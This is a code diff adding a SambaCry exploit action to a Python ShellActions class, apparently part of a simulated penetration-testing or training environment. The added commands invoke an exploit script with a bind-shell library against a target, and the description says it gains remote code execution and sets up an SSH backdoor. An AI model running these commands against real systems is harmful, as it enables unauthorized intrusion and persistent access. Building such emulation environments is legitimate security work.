@@ -58,3 +58,22 @@ class ShellActions:
                             "or weaker channels",
                       cost=0.0, noise=0.0, index=index,
                       ip=None, subnet=False, action_outcome=ActionOutcome.PIVOTING, alt_cmd=None)
+
+    @staticmethod
+    def SAMBA_EXPLOIT(index: int) -> Action:
+        """
+        Launches the sambacry exploit
+
+        :param index: index of the machine to apply the action to
+        :return: the action
+        """
+        id = ActionId.SAMBACRY_EXPLOIT
+        cmd = ["sudo service ssh start",
+               "/samba_exploit.py -e /libbindshell-samba.so -s data -r /data/libbindshell-samba.so -u sambacry -p nosambanocry -P 6699 -t {}"
+               ]
+        return Action(id=id, name="Sambacry Explolit", cmd=cmd,
+                      type=ActionType.EXPLOIT,
+                      descr="Uses the sambacry shell to get remote code execution and then sets up a SSH backdoor "
+                            "to upgrade the channel",
+                      cost=0.0, noise=0.0, index=index,
+                      ip=None, subnet=False, action_outcome=ActionOutcome.SHELL_ACCESS, alt_cmd=None)
